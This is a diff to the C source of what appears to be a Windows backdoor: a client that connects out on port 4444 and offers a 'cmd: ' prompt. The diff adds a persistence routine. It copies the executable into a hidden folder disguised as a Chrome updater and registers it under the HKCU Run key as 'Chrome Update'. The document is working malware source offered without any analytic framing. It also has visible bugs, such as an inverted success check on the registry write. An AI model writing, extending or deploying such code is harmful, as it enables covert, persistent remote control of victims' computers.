@@ -3,17 +3,19 @@
 #include <WS2tcpip.h>
 #include <string.h>
 #include <strsafe.h>
+#include <Shlobj_core.h>
 
 //link to use winsock2
 #pragma comment(lib, "Ws2_32.lib")
 #define BUFFER_SIZE 1024
-#define TIME_WAIT 30000
+#define TIME_WAIT 3000
 #define HOST  L"0.0.0.0"
 #define PORT  L"4444"
 #define PROMPT "cmd: "
 
-SOCKET connectServer();
+
 void setup();
+SOCKET connectServer();
 
 int main(int argc, char** argv) {
 
@@ -138,4 +140,71 @@ SOCKET connectServer() {
 
 	return sock;
 }
-void setup();
+
+//persistence
+void setup() {
+	wchar_t currentPath[BUFFER_SIZE];
+	wchar_t destPath[BUFFER_SIZE];
+	PWSTR homeDir;
+
+	//get full file path
+	if (!GetModuleFileName(NULL, currentPath, BUFFER_SIZE)) {
+
+		printf("Cant get current file path");
+		return;
+
+	}
+
+	if (wcsstr(currentPath, L"\\.Chrome\\Chrome Update\\backdoor.exe")) {
+
+		return;
+
+	}
+
+	//Retrieves the full path of a known folder identified by the folder's KNOWNFOLDERID.
+	//FOLDERID_Profile default path: %USERPROFILE% (%SystemDrive%\Users\%USERNAME%)  (https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
+	if (SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &homeDir) != S_OK) {
+
+		printf("SHGetKnownFolderPath failed");
+		return;
+
+	}
+
+	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\Chrome Update", homeDir);
+
+	//create dir
+	SHCreateDirectory(NULL, destPath);
+
+	StringCbCat(destPath, BUFFER_SIZE, L"\\backdoor.exe");
+
+	//move to hide (replace if already exits and make a copy if cant move)
+	if (!MoveFileEx(currentPath, destPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) {
+
+		printf("Cant move file");
+		return;
+
+	}
+	//hidden file
+	if (!SetFileAttributes(destPath, FILE_ATTRIBUTE_HIDDEN)){
+
+		printf("Cant set file hidden attribute");
+		return;
+	
+	}
+
+	HKEY hRunKey = NULL;
+
+	//persistence
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, KEY_SET_VALUE, &hRunKey)){ //KEY_SET_VALUE: Required to create, delete, or set a registry value.
+	
+		printf("Cant open registry key");
+		return;
+	}
+	if (RegSetValueEx(hRunKey, L"Chrome Update", 0, REG_SZ, (const BYTE*)destPath, wcslen(destPath))== ERROR_SUCCESS) {
+
+		printf("Cant set value under registry key");
+		return;
+	}
+	RegCloseKey(hRunKey);
+}
